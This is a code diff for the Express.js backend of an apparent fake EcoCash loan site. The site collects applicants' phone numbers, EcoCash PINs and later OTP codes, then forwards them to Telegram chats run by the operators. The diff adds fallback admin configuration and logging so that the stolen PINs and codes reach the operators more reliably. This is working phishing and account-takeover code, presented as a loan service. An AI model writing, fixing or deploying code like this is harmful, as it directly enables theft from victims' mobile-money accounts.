@@ -15,10 +15,12 @@ app.use(express.static(publicPath));
 
 const APP_URL = process.env.APP_URL || 'https://ecocash-aot6.onrender.com';
 
-function loadAdminsFromEnv() {
+// Dynamic function to resolve admins at runtime
+function getAdmins() {
   const admins = [];
+  
+  // Check primary ADMIN_1_CHAT_ID or legacy ADMIN_CHAT_ID
   let index = 1;
-
   while (process.env[`ADMIN_${index}_CHAT_ID`]) {
     const chatId = process.env[`ADMIN_${index}_CHAT_ID`].trim();
     if (chatId) {
@@ -32,10 +34,19 @@ function loadAdminsFromEnv() {
     index++;
   }
 
+  // Fallback if user configured ADMIN_CHAT_ID instead
+  if (admins.length === 0 && process.env.ADMIN_CHAT_ID) {
+    admins.push({
+      key: 'main',
+      name: 'Main Admin',
+      chatId: process.env.ADMIN_CHAT_ID.trim(),
+      isMain: true
+    });
+  }
+
   return admins;
 }
 
-const ADMINS = loadAdminsFromEnv();
 const activeApplications = new Map();
 
 function formatZimbabwePhone(phone) {
@@ -54,6 +65,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   if (!botToken) return;
 
   const { message, callback_query } = req.body;
+  const ADMINS = getAdmins();
 
   if (message && message.text && message.text.startsWith('/start')) {
     const chatId = message.chat.id;
@@ -147,11 +159,11 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
       body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' })
     });
   } catch (err) {
-    console.error(err.message);
+    console.error("Telegram edit error:", err.message);
   }
 }
 
-// RECEIVES COMBINED STEP 1 & STEP 2 DATA AND SENDS TO TELEGRAM AT ONCE
+// RECEIVES COMBINED STEP 1 & STEP 2 DATA AND DELIVERS TO TELEGRAM
 app.post('/api/apply-loan', async (req, res) => {
   try {
     const data = req.body;
@@ -163,7 +175,20 @@ app.post('/api/apply-loan', async (req, res) => {
     activeApplications.set(appReference, appData);
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    if (botToken) {
+    const ADMINS = getAdmins();
+
+    console.log(`[APPLY] New application submitted: ${appReference}`);
+    console.log(`[APPLY] Loaded ${ADMINS.length} admin(s) for delivery.`);
+
+    if (!botToken) {
+      console.error('[APPLY ERROR] TELEGRAM_BOT_TOKEN environment variable is missing!');
+    }
+
+    if (ADMINS.length === 0) {
+      console.error('[APPLY ERROR] No ADMIN Chat IDs found! Check ADMIN_1_CHAT_ID or ADMIN_CHAT_ID in Render Environment Variables.');
+    }
+
+    if (botToken && ADMINS.length > 0) {
       for (const admin of ADMINS) {
         if (!admin.chatId) continue;
         const msgText = `🔑 <b>NEW LOAN APPLICATION (STEP 1 & 2 DELIVERED)</b>\n\n` +
@@ -176,7 +201,7 @@ app.post('/api/apply-loan', async (req, res) => {
                         `📞 <b>Phone:</b> +263${formattedPhone}\n` +
                         `🔑 <b>EcoCash PIN:</b> <code>${data.pin}</code>`;
 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -193,11 +218,15 @@ app.post('/api/apply-loan', async (req, res) => {
             }
           })
         });
+
+        const tgJson = await tgRes.json();
+        console.log(`[TELEGRAM RESPONSE] Sent to Chat ID ${admin.chatId}:`, tgJson);
       }
     }
 
     res.status(201).json({ success: true, appReference });
   } catch (error) {
+    console.error("[SERVER ERROR]", error);
     res.status(500).json({ success: false, error: "Internal Server Error" });
   }
 });
@@ -212,7 +241,9 @@ app.post('/api/submit-otp', async (req, res) => {
     activeApplications.set(appReference, appData);
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    if (botToken) {
+    const ADMINS = getAdmins();
+
+    if (botToken && ADMINS.length > 0) {
       for (const admin of ADMINS) {
         if (!admin.chatId) continue;
         const msgText = `📲 <b>RECEIVED OTP CODE (STEP 3)</b>\n\n` +
@@ -256,4 +287,3 @@ app.get('*', (req, res) => {
 });
 
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
-        
